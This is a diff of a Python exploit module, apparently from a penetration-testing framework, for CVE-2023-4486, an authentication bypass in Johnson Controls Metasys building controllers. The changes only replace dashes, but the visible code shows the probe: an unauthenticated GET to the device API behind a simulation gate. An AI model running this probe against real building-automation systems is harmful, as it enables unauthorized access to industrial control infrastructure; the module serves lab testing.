@@ -1,4 +1,4 @@
-"""CVE-2023-4486 — Johnson Controls Metasys auth bypass (Level A)."""
+"""CVE-2023-4486 - Johnson Controls Metasys auth bypass (Level A)."""
 
 import socket
 
@@ -16,7 +16,7 @@ except ImportError:
 
 class Exploit(Exploit):
     __info__ = {
-        "name": "CVE-2023-4486 — Johnson Controls Metasys Authentication Bypass",
+        "name": "CVE-2023-4486 - Johnson Controls Metasys Authentication Bypass",
         "description": "Metasys ADX/NAE/NCE unauthenticated API access (Level A lab PoC).",
         "authors": ("Andre Henrique (@mrhenrike)",),
         "references": ("https://nvd.nist.gov/vuln/detail/CVE-2023-4486",),
@@ -43,7 +43,7 @@ class Exploit(Exploit):
         url = f"https://{self.target}:{self.port}/api/v1/devices"
         if self.simulate or not self.destructive:
             DestructiveGate.print_simulation(
-                description=f"GET {url} without Authorization header — expect 200 + device list",
+                description=f"GET {url} without Authorization header - expect 200 + device list",
                 mitre_techniques=["T0886"],
             )
             return
@@ -53,6 +53,6 @@ class Exploit(Exploit):
         print_status(f"Probing {url} ...")
         try:
             r = requests.get(url, verify=False, timeout=8)
-            print_info(f"HTTP {r.status_code} — {len(r.content)} bytes")
+            print_info(f"HTTP {r.status_code} - {len(r.content)} bytes")
         except Exception as exc:
             print_error(str(exc))
